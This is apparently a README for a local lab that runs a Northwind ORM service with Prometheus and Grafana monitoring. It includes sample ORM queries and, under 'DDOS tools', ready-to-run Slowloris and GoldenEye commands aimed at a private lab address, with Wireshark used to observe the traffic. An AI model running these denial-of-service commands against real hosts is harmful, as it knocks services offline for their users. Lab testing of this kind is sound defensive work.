# Northwind lab

## Scripts

Start:

```sh
./start.sh
```

End:

```sh
./end.sh
```

## Lab

Execute query for cli

```sh
# verify
docker exec sec-ddos_orm_1 lambdaorm execute -w ./workspace -e .env -q 'Products.having(p => max(p.price) > 100).map(p => ({ category: p.category.name, largestPrice: max(p.price) })).sort(p => desc(p.largestPrice))'

docker exec sec-ddos_orm_1 lambdaorm execute -w ./workspace -e .env -q 'Orders.filter(p => p.id === id)' -d '{"id": 2 }'

docker exec sec-ddos_orm_1 lambdaorm execute -w ./workspace -e .env -q 'Orders.filter(p => p.id === id).include(p => [p.customer.map(p => p.name), p.details.include(p => p.product.include(p => p.category.map(p => p.name)).map(p => p.name)).map(p => [p.quantity, p.unitPrice])])' -d '{"id": 2 }'
```

## Endpoints

- [swagger](http://localhost:9292/api-docs)
- [metrics](http://localhost:9292/metrics)
- [Prometheus](http://localhost:9090)
- [Grafana](http://localhost:3000)
  - Dashboards
    - [NodeJS Application Dashboard](http://localhost:3000/d/PTSqcpJWk/nodejs-application-dashboard?orgId=1&refresh=5s)

## DDOS tools

### Slowloris

```sh
cd ~/Desktop
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py 192.168.1.33 -p 9292 -s 1000 -v
```

### GoldenEye

**Execute:**

```sh
cd /Desktop/GoldenEye
./goldeneye.py http://192.168.1.33:9292/metrics -s 1000 -w 30 
```

### Test

start wireshark:

```sh
sudo wireshark
```

Filter: tcp.port == 9292
